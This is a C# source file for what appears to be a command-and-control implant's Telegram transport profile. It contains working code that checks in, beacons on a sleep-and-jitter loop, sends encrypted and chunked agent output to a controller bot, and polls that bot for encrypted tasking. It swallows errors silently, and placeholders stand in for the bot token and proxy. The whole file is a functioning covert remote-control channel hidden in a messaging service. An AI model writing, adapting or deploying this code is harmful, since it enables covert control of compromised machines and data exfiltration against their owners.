using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Text.Json;

namespace Agent.Profiles;

public sealed class TelegramProfile : IProfile, IDisposable
{
    private const int EnvelopeChunkSize = 2800;
    private readonly IAgentConfig _agentConfig;
    private readonly ICryptoManager _crypto;
    private readonly IMessageManager _messageManager;
    private readonly TelegramApiClient _telegram;
    private readonly ChunkAssembler _assembler = new();
    private readonly string _controllerBot = NormalizeUsername("%TG_CONTROLLER_BOT%");
    private readonly string _routeId = Guid.NewGuid().ToString("N");
    private readonly int _messageChecks = ParsePositiveInt("%TG_MESSAGE_CHECKS%", 10);
    private readonly int _timeBetweenChecks = ParsePositiveInt("%TG_TIME_BETWEEN_CHECKS%", 10);
    private CancellationTokenSource _cancellation = new();

    public TelegramProfile(
        IAgentConfig agentConfig,
        ICryptoManager crypto,
        ILogger logger,
        IMessageManager messageManager)
    {
        _agentConfig = agentConfig;
        _crypto = crypto;
        _messageManager = messageManager;
        _telegram = new TelegramApiClient(
            "%TG_BOT_TOKEN%",
            "%TG_API_BASE%",
            "%TG_USER_AGENT%",
            "%TG_PROXY_HOST%",
            "%TG_PROXY_PORT%",
            "%TG_PROXY_USER%",
            "%TG_PROXY_PASS%");
    }

    public event EventHandler<TaskingReceivedArgs>? SetTaskingReceived;

    public async Task<CheckinResponse> Checkin(Checkin checkin)
    {
        string serialized = JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin);
        await SendPayloadAsync(_crypto.Encrypt(serialized), CancellationToken.None);
        string? response = await ReceivePayloadAsync(CancellationToken.None);
        if (response is null)
        {
            return new CheckinResponse { status = "failed" };
        }

        CheckinResponse? checkinResponse = JsonSerializer.Deserialize(
            _crypto.Decrypt(response),
            CheckinResponseJsonContext.Default.CheckinResponse);
        return checkinResponse ?? new CheckinResponse { status = "failed" };
    }

    public async Task StartBeacon()
    {
        if (_cancellation.IsCancellationRequested)
        {
            _cancellation.Dispose();
            _cancellation = new CancellationTokenSource();
        }

        CancellationToken cancellationToken = _cancellation.Token;
        while (!cancellationToken.IsCancellationRequested)
        {
            try
            {
                string outbound = _messageManager.GetAgentResponseString();
                await SendPayloadAsync(_crypto.Encrypt(outbound), cancellationToken);
                string? inbound = await ReceivePayloadAsync(cancellationToken);
                if (inbound is not null)
                {
                    GetTaskingResponse? tasking = JsonSerializer.Deserialize(
                        _crypto.Decrypt(inbound),
                        GetTaskingResponseJsonContext.Default.GetTaskingResponse);
                    if (tasking is not null)
                    {
                        SetTaskingReceived?.Invoke(this, new TaskingReceivedArgs(tasking));
                    }
                }
            }
            catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
            {
                break;
            }
            catch
            {
            }

            int delaySeconds = Math.Max(1, Misc.GetSleep(_agentConfig.sleep, _agentConfig.jitter));
            try
            {
                await Task.Delay(TimeSpan.FromSeconds(delaySeconds), cancellationToken);
            }
            catch (OperationCanceledException) when (cancellationToken.IsCancellationRequested)
            {
                break;
            }
        }
    }

    public bool StopBeacon()
    {
        _cancellation.Cancel();
        return true;
    }

    private async Task SendPayloadAsync(string payload, CancellationToken cancellationToken)
    {
        string packetId = Guid.NewGuid().ToString("N");
        int chunks = Math.Max(1, (payload.Length + EnvelopeChunkSize - 1) / EnvelopeChunkSize);
        for (int index = 0; index < chunks; index++)
        {
            int offset = index * EnvelopeChunkSize;
            int length = Math.Min(EnvelopeChunkSize, payload.Length - offset);
            var envelope = new TelegramEnvelope
            {
                SenderId = _routeId,
                ToServer = true,
                PacketId = packetId,
                Chunk = index,
                Chunks = chunks,
                Message = payload.Substring(offset, length)
            };

            string text = JsonSerializer.Serialize(envelope);
            await _telegram.SendTextAsync(_controllerBot, text, cancellationToken);
        }
    }

    private async Task<string?> ReceivePayloadAsync(CancellationToken cancellationToken)
    {
        for (int attempt = 0; attempt < _messageChecks; attempt++)
        {
            IReadOnlyList<TelegramUpdate> updates = await _telegram.GetUpdatesAsync(
                _timeBetweenChecks,
                cancellationToken);
            foreach (TelegramUpdate update in updates)
            {
                TelegramMessage? message = update.Message;
                if (message?.From?.IsBot != true ||
                    !string.Equals(
                        NormalizeUsername(message.From.Username ?? string.Empty),
                        _controllerBot,
                        StringComparison.OrdinalIgnoreCase) ||
                    string.IsNullOrWhiteSpace(message.Text))
                {
                    continue;
                }

                TelegramEnvelope? envelope;
                try
                {
                    envelope = JsonSerializer.Deserialize<TelegramEnvelope>(message.Text);
                }
                catch (JsonException)
                {
                    continue;
                }

                if (envelope is null ||
                    envelope.ToServer ||
                    !string.Equals(envelope.ClientId, _routeId, StringComparison.Ordinal))
                {
                    continue;
                }

                if (_assembler.TryAdd(envelope, out string assembled))
                {
                    return assembled;
                }
            }
        }

        return null;
    }

    private static int ParsePositiveInt(string value, int fallback)
    {
        return int.TryParse(value, out int parsed) && parsed > 0 ? parsed : fallback;
    }

    private static string NormalizeUsername(string username)
    {
        string normalized = username.Trim();
        return normalized.StartsWith('@') ? normalized : "@" + normalized;
    }

    public void Dispose()
    {
        _cancellation.Cancel();
        _cancellation.Dispose();
        _telegram.Dispose();
    }
}
